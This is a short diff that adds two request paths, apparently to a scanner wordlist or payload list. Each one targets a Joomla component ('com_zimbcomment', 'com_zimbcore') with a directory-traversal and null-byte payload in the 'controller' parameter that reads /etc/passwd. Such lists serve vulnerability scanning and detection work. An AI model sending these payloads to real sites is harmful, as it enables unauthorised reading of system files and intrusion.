@@ -1,0 +1,2 @@
+/index.php?option=com_zimbcomment&controller=../../../../../../../../../../etc/passwd%00
+/index.php?option=com_zimbcore&controller=../../../../../../../../../../etc/passwd%00
